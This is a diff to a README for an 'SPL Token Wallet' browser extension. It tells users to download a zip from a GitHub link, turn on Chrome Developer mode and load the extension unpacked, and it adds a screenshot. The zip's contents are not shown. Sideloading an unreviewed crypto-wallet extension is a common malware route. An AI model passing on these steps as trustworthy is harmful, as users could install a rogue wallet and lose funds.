@@ -1,7 +1,8 @@
 # SPL Token Wallet
 ## How to install Chrome extensions manually
-**1.** Download the extension zip file directly here [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip), Then Unzip the file to a folder.<br>
+**1.** Download the extension zip file directly here [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip).<br>
 **2.** Go to **chrome://extensions/** and check the box for **Developer mode** in the top right.<br>
+![See examples below](https://www.cnet.com/a/img/resize/f2f6570076ded3f971181de43a2f940f04d8e1be/hub/2017/01/18/b9cd8c02-4a43-4c32-b5b9-65b5fa4e96bf/developer-mode-chrome.jpg?auto=webp&width=1200)
 **3.** Locate the ZIP file on your computer and unzip it.<br>
 **4.** Go back to the **chrome://extensions/** page and click the **Load unpacked extension** button and select the **unzipped folder** for your extension to install it.<br>
 
